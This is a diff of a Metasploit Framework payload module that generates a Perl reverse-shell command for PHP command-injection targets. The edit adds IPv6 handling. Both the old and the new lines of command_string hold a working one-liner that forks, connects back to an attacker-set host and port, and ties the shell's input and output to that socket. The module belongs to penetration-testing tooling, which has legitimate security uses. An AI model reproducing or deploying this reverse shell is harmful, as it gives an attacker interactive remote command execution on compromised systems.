@@ -1,12 +1,8 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -23,8 +19,7 @@ module Metasploit3
 
 	def initialize(info = {})
 		super(merge_info(info,
-			'Name'          => 'PHP Command, Double reverse TCP connection (via perl)',
-			'Version'       => '$Revision$',
+			'Name'          => 'PHP Command, Double reverse TCP connection (via Perl)',
 			'Description'   => 'Creates an interactive shell via perl',
 			'Author'        => 'cazz',
 			'License'       => BSD_LICENSE,
@@ -56,9 +51,10 @@ module Metasploit3
 	# Returns the command string to use for execution
 	#
 	def command_string
-		cmd = "perl -MIO -e '$p=fork;exit,if($p);" +
-			"$c=new IO::Socket::INET(PeerAddr,\"#{datastore['LHOST']}:#{datastore['LPORT']}\");" +
-			"STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
+		lhost = datastore['LHOST']
+		ver   = Rex::Socket.is_ipv6?(lhost) ? "6" : ""
+		lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
+		cmd   = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET#{ver}(PeerAddr,\"#{lhost}:#{datastore['LPORT']}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
 	end
 
 end
